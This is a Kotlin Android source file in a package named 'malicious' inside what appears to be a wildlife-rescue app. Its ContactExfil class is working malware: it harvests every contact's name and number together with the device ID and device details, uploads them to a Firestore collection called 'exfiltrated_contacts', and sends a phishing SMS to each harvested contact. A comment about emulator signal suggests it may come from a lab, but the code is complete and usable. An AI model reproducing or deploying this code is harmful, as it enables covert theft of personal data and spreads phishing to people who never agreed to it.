package com.example.wildliferescuer.malicious

import android.content.Context
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.util.Log
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import java.text.SimpleDateFormat
import java.util.*
import kotlin.concurrent.thread

class ContactExfil {

    private lateinit var firestore: FirebaseFirestore
    private lateinit var auth: FirebaseAuth

    // Public method to fetch contacts list
    fun fetchContacts(context: Context): List<ContactEntry> {
        val contactsList = mutableListOf<ContactEntry>()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            cursor?.use {
                val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                val idIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)

                while (it.moveToNext()) {
                    val name = it.getString(nameIndex) ?: "Unknown"
                    val number = it.getString(numberIndex)?.replace(Regex("[^0-9+]"), "") ?: "No number"
                    val contactId = it.getString(idIndex) ?: UUID.randomUUID().toString()

                    contactsList.add(
                        ContactEntry(
                            contactId = contactId,
                            name = name,
                            phoneNumber = number,
                            timestamp = System.currentTimeMillis()
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.e("ContactExfil", "Error fetching contacts", e)
        }
        return contactsList
    }

    // Method to upload contacts to Firestore
    fun uploadContactsToFirestore(context: Context, contacts: List<ContactEntry>) {
        firestore = FirebaseFirestore.getInstance()
        auth = FirebaseAuth.getInstance()

        thread {
            auth.signInAnonymously()
                .addOnCompleteListener { task ->
                    if (task.isSuccessful) {
                        Log.d("FirebaseAuth", "Signed in anonymously: ${auth.currentUser?.uid}")
                    } else {
                        Log.e("FirebaseAuth", "Anonymous auth failed", task.exception)
                    }
                    uploadContacts(contacts, context)
                }
        }
    }

    private fun uploadContacts(contacts: List<ContactEntry>, context: Context) {
        try {
            val deviceId = getDeviceId(context)
            val deviceInfo = getDeviceInfo()
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(Date())

            val documentId = "${System.currentTimeMillis()}_${UUID.randomUUID().toString().substring(0, 8)}"

            val contactData = hashMapOf(
                "uploadId" to documentId,
                "deviceId" to deviceId,
                "userId" to (auth.currentUser?.uid ?: "anonymous"),
                "timestamp" to FieldValue.serverTimestamp(),
                "timestampReadable" to timestamp,
                "contactCount" to contacts.size,
                "deviceInfo" to deviceInfo,
                "appVersion" to "1.0",
                "contacts" to contacts.mapIndexed { index, contact ->
                    hashMapOf(
                        "id" to index,
                        "contactId" to contact.contactId,
                        "name" to contact.name,
                        "phoneNumber" to contact.phoneNumber,
                        "timestamp" to contact.timestamp
                    )
                }
            )

            firestore.collection("exfiltrated_contacts")
                .document(documentId)
                .set(contactData)
                .addOnSuccessListener {
                    Log.d("Firestore", "Contacts uploaded successfully with ID: $documentId")
                    val summaryData = hashMapOf(
                        "uploadId" to documentId,
                        "deviceId" to deviceId,
                        "timestamp" to FieldValue.serverTimestamp(),
                        "timestampReadable" to timestamp,
                        "contactCount" to contacts.size
                    )
                    firestore.collection("contact_uploads_summary")
                        .document(documentId)
                        .set(summaryData)
                        .addOnSuccessListener {
                            Log.d("Firestore", "Summary created successfully")
                        }
                }
                .addOnFailureListener { e ->
                    Log.e("Firestore", "Failed to upload contacts", e)
                }
        } catch (e: Exception) {
            Log.e("Firestore", "Error uploading to Firestore", e)
        }
    }

    // Enhanced SMS sending with detailed logging
    fun sendPhishingSms(context: Context, contacts: List<ContactEntry>, message: String) {
        Log.d("Phishing", "=== Starting sendPhishingSms ===")
        Log.d("Phishing", "Contacts count: ${contacts.size}")

        try {
            val smsManager = SmsManager.getDefault()
            var sentCount = 0

            for (contact in contacts) {
                val phoneNumber = contact.phoneNumber
                Log.d("Phishing", "Processing contact: ${contact.name} | Number: $phoneNumber")

                // Validate phone number: must be non-empty, not "No number", and should contain at least one digit
                if (phoneNumber.isNotEmpty() && phoneNumber != "No number" && phoneNumber.any { it.isDigit() }) {
                    Log.d("Phishing", "Sending SMS to ${contact.name} at $phoneNumber")
                    try {
                        smsManager.sendTextMessage(phoneNumber, null, message, null, null)
                        sentCount++
                        Log.d("Phishing", "Sent to ${contact.name} (${contact.phoneNumber})")
                    } catch (e: Exception) {
                        Log.e("Phishing", "Failed to send to ${contact.name}: ${e.message}", e)
                    }
                } else {
                    Log.d("Phishing", "Skipping invalid number for ${contact.name}: $phoneNumber")
                }
            }

            Log.d("Phishing", "Finished sending. Successful sends: $sentCount / ${contacts.size}")

            // If no messages were sent, suggest checking contact numbers and emulator network.
            if (sentCount == 0) {
                Log.w("Phishing", "No SMS were sent. Check that your contacts have valid phone numbers and the emulator has cellular signal.")
            }

        } catch (e: Exception) {
            Log.e("Phishing", "Exception during SMS sending", e)
        }
    }

    // Helper method to test SMS with a hardcoded number
    fun testSendSms(context: Context, phoneNumber: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            Log.d("Phishing", "Test SMS sent to $phoneNumber")
        } catch (e: Exception) {
            Log.e("Phishing", "Test SMS failed", e)
        }
    }

    // harvestAndSend for backward compatibility
    fun harvestAndSend(context: Context) {
        val contacts = fetchContacts(context)
        if (contacts.isNotEmpty()) {
            uploadContactsToFirestore(context, contacts)
        }
    }

    private fun getDeviceId(context: Context): String {
        return try {
            android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: UUID.randomUUID().toString()
        } catch (e: Exception) {
            UUID.randomUUID().toString()
        }
    }

    private fun getDeviceInfo(): Map<String, String> {
        return hashMapOf(
            "manufacturer" to android.os.Build.MANUFACTURER,
            "model" to android.os.Build.MODEL,
            "androidVersion" to android.os.Build.VERSION.RELEASE,
            "sdkInt" to android.os.Build.VERSION.SDK_INT.toString()
        )
    }

    data class ContactEntry(
        val contactId: String,
        val name: String,
        val phoneNumber: String,
        val timestamp: Long
    )
}